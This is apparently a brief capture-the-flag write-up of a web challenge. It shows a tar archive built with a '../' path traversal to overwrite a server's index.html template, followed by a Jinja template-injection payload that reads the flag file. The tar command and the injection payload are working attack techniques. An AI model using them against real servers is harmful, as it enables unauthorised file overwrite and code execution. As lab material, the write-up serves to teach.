Looking at the downloaded source code we can exploit how it moves the files to the final location to allow for uploading files anywhere
We can use this to replace the `index.html` as to run random code on the server through the templating engine
So setting a file up called `index.html` in a templates directory and then using the below tar command to generate a tar archive for upload
```bash
tar -czvf symlink.tar.gz -P "../../../templates/index.html"
```
The `-P` flag preserves the file path with the `../` included, so when the server extracts it, the index template is overwritten with our file so a quick refresh grants access to the malicious file and we can run any code
In our case we can read the flag
```py
{{ get_flashed_messages.__globals__.__builtins__.open("/app/flag").read() }}
```